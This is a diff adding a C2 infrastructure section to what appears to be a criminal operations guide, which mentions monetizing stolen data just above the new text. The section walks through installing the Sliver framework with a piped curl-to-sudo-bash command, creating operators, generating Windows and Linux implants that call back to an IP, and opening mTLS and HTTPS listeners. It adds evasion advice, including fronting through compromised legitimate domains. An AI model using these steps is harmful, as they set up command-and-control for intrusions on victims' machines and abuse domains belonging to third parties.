@@ -285,3 +285,71 @@ expired=id
 - Data successfully monetized
 
 ## C2 Infrastructure Setup
+
+### Sliver C2 Framework Setup
+
+**1. Server Requirements**
+- Recommended: VPS (I use [4vps.su](https://4vps.su))
+  
+**2. Installation**
+```bash
+curl https://sliver.sh/install | sudo bash
+```
+Then start Sliver:
+```bash
+sliver
+```
+
+**3. Basic Configuration**
+- Client connects to local server by default
+- Create new operators:
+  ```bash
+  sliver > new-operator
+  ```
+- For external servers: Edit configuration file
+
+### Generating Implants
+**Windows payload:**
+```bash
+sliver > generate --mtls 192.168.1.10 --os windows
+```
+
+**Linux payload:**
+```bash
+sliver > generate --mtls 192.168.1.10 --os linux
+```
+
+### Listeners Setup
+**MTLS listener:**
+```bash
+sliver > listener mtls --host 192.168.1.10
+```
+
+**HTTPS listener:**
+```bash
+sliver > listener https --host 192.168.1.10
+```
+
+### Operational Security
+- **Domain Fronting:** Use compromised legitimate domains
+- **Encryption:** Always use HTTPS/mTLS
+- **Rotation:** Regularly change infrastructure
+
+### Implant Types
+| Feature        | Beacons                     | Implants                  |
+|---------------|----------------------------|--------------------------|
+| Activity      | Low-noise, asynchronous     | Constant connection       |
+| Detection Risk | Low                        | Higher                   |
+| Flexibility   | Modular, dynamic commands  | Predefined functionality |
+| Use Case      | Stealthy operations        | Immediate interaction    |
+
+**Key Differences:**
+- **Beacons:** 
+  - Lightweight callbacks
+  - On-demand tasking
+  - Better for evasion
+
+- **Implants:**
+  - Persistent connection
+  - Faster response
+  - Easier to detect
